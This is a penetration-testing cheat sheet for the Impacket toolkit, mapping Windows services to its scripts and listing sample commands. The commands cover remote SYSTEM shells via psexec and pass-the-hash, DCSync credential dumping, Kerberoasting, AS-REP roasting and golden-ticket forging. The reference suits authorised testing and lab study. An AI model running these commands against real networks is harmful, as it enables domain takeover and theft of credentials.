**Start with the service and the individual script name.** Kali commonly uses `impacket-NAME`; HTB notes often use `NAME.py`. Check the specific program with `-h`.

| Service / task | Script names | Open the command reference |
| --- | --- | --- |
| SMB remote shell | `psexec.py` / `impacket-psexec` | [PsExec quickstart](/tools/psexec) |
| SMB service execution | `smbexec.py` / `impacket-smbexec` | [SMBexec](/tools/windows-remote-execution#smbexec-py) |
| WMI/DCOM execution | `wmiexec.py` / `impacket-wmiexec` | [WMIexec](/tools/windows-remote-execution#wmiexec-py) |
| Scheduled task over SMB | `atexec.py` / `impacket-atexec` | [ATexec](/tools/windows-remote-execution#atexec-py) |
| DCOM execution | `dcomexec.py` / `impacket-dcomexec` | [DCOMexec](/tools/windows-remote-execution#dcomexec-py) |
| MSSQL | `mssqlclient.py` / `impacket-mssqlclient` | [Database connection](/enumeration/mssql-microsoft-sql-server-cheat-sheet) |
| SMB client / local server | `smbclient.py`, `smbserver.py` / `impacket-smbclient`, `impacket-smbserver` | [SMB](/enumeration/smb-enumeration-server-message-block) · [Transfers](/post-exploitation/file-transfers-cheat-sheet) |

SMB authentication does not imply service-control privileges. For WMI/DCOM, TCP 135 and negotiated endpoints must work; default command output also uses SMB. [Compare execution methods](/tools/windows-remote-execution).

## Original captured examples

Preserved from the original note. Prefer the task-specific references above for prerequisites and current launcher names. The earlier “quieter” label below is relative, not a promise of stealth; execution and output retrieval leave observable activity.


The Python toolkit behind most AD attacks. Common scripts:

```bash
# remote execution (need admin creds or hash)
psexec.py $DOMAIN/admin:PASS@$IP            # SYSTEM shell (noisy)
wmiexec.py $DOMAIN/admin@$IP -hashes :<nt>  # semi-interactive, quieter
smbexec.py / atexec.py / dcomexec.py        # alternatives
# credentials
secretsdump.py $DOMAIN/USER:PASS@$DC -just-dc   # DCSync
GetUserSPNs.py $DOMAIN/USER:PASS -dc-ip $DC -request     # Kerberoast
GetNPUsers.py  $DOMAIN/ -usersfile users.txt -no-pass    # AS-REP roast
# tickets
getTGT.py $DOMAIN/USER:PASS ; export KRB5CCNAME=USER.ccache
ticketer.py -nthash <krbtgt> -domain-sid <sid> -domain $DOMAIN Administrator   # golden
# shares / lookups
smbclient.py ; lookupsid.py ; mssqlclient.py $DOMAIN/USER:PASS@$IP -windows-auth
```


> Many authentication-capable scripts support `-hashes LM:NT` or `-k` for Kerberos (with `KRB5CCNAME`), but options differ. Check the specific script with `-h`. Use FQDN + `-dc-ip` when Kerberos is finicky.
